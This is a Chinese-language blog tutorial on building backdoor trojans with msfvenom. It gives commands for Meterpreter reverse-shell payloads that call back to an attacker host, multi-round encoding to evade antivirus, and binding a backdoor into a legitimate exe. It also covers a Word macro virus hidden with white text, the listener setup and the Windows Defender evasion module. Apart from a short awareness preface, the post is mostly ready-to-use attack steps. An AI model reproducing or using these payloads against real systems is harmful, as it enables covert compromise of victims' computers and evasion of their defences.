---
title: 后门木马之Msfvenom
author: Pandaho
date: 2021-07-12 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/security-Msfvenom/cover.png
---



*在这个互联网世界，人们已经离不开软件的使用，而很多非安全从业者其安全意识的薄弱让木马软件如洪水一般地泛滥，使得大量个人电脑沦落为肉鸡，虽现在杀毒引擎已能查杀市面上大部分主流的病毒，但免杀技术也是在不断发展，所以个人对其主机上使用的软件安全还是要有一定的审查能力，避免不知不觉就成为他人的玩偶。*




## **原理**

**Msfvenom：**

主要用于生成后门和软件捆绑后门,可利用msfvenom生成木马程序，在本地开启监听，并在目标机上执行，使目标机沦为肉鸡。

**MSF渗透攻击流程：**

1、扫描目标机系统，寻找可用漏洞。

2、选择并配置一个漏洞利用模块。

3、选择并配置一个攻击载荷模块。

4、选择一个编码技术，用来绕过杀毒软件的查杀。

5、进行渗透攻击。

病毒通常会做一些有害的或者恶性的动作。在病毒代码中实现这个功能的部分叫做“有效负载”（payload）。payload可以实现任何运行在受害者环境中的程序所能做的事情，并且能够执行动作包括破坏文件删除文件，向病毒的作者或者任意的接收者发送敏感信息，以及提供通向被感染计算机的后门。      **———摘自《决战恶意代码》**

payloads模块，也叫有效载荷或有效负载，也就是我们常说的shellcode。在MSF中为我们提供了大量的实用payloads。

**编码器：**正常的MSFVenom生成的有效负载很容易被大多数杀毒软件或防火墙检测到。MSFVenom提供了一种称为编码器的功能，可以用来绕过防火墙和防病毒软件。您可以利用其中的一些AV旁路和WAF旁路。使用-e标志将其与任何编码器名称一起使用

**宏病毒：**宏病毒是一种寄存在文档或模板的宏中的计算机病毒，存在于数据文件或模板中（字处理文档、数据表格、数据库、演示文档等），使用宏语言编写，利用宏语言的功能将自己寄生到其他数据文档，一旦打开带有宏病毒的文档，宏就会被执行，宏病毒就会被激活，转移到计算机上，驻留在Normal模板上。在此之后所有自动保存的文档都会“感染”上这种宏病毒，如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。



## **方法**

**生成木马**

```shell
msfvenom -a（指定架构，选择x86，也能在64位下运行） X86 -platform（指定运行平台）  windows -p（指定攻击载荷） windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=（端口） -b（去掉坏字符）“\x00”(x表示16进制，00表示空字符) -e（指定编码器，主要为了逃过杀毒，免杀） x86/shikata_ga_nai -i(编码次数) 10 （文件随着编码次数变大） -f（指定输出格式） exe -o /var/xxxxxx
```

**植入软件后门**

```shell
msfvenom -a（指定架构，选择x86，也能在64位下运行） X86 --platform（指定运行平台）  windows -p（指定攻击载荷） windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=（端口） -b（去掉坏字符）“\x00”(x表示16进制，00表示空字符) -e（指定编码器，主要为了逃过杀毒，免杀） x86/shikata_ga_nai -i(编码次数) 10 -x   xxxx.exe  -f（指定输出格式） exe -o /var/xxxxxx
```

**多层编译**

```shell
msfvenom -a（指定架构，选择x86，也能在64位下运行） X86 -platform（指定运行平台）  windows -p（指定攻击载荷） windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=（端口） -b（去掉坏字符）“\x00”(x表示16进制，00表示空字符) -e（指定编码器，主要为了逃过杀毒，免杀） x86/shikata_ga_nai -i(编码次数) 10 （文件随着编码次数变大） | msfvenom -a（指定架构，选择x86，也能在64位下运行） X86 -platform（指定运行平台）  windows -e x86/alpha_upper -I 10 -f（指定输出格式） exe -o /var/xxxxxx
```

**制作宏病毒**

```shell
msfvenom -a X86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.42.1 LPORT=4444  -e x86/shikata_ga_nai -i 10  -f  vba-exe
```

生成Marco code，创建个宏后将code copy到宏内，然后将将剩下的宏代码copy到word中，字体颜色设置成与背景一样的白色等进行隐藏。



**开启MSF监听**

```shell
msfdb run  #运行msf
use exploit/multi/handler   #加载监听模块
show options   #显示参数
set payload windows/meterpreter/reverse_tcp  #设置攻击载荷
set LHOST 和 LPORT   #设置ip和端口
RUN  #运行
help  #查看命令
在目标机（windows）可 ps 查询 pid号，通过 taskkill /pid  ?  杀死进程
```

我们还可以使用其他模块，在进入msfdb的时候我们会发现evasion存在多个模块

```shell
search evasion  #搜索全部模块
use  evasion/windows/windows_defender_exe  
该模块生成的木马文件，可修改filename

   Name      Current Setting  Required  Description  
   ----      ---------------  --------  -----------
   FILENAME  Kydqcp.exe       yes       Filename for the evasive file (default: random)
   
Run   #运行生成木马
[*] Compiled executable size: 3584
[+] Kydqcp.exe stored at /root/.msf4/local/Kydqcp.exe
```

![附图](/assets/img/security-Msfvenom/1.png)



## 参考来源

学神科技

[基础msfvenom](https://www.bilibili.com/read/cv7159256/)

[原理](http://www.91ri.org/5105.html)

[英文详解](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)

[宏病毒](https://zhuanlan.zhihu.com/p/222086692)
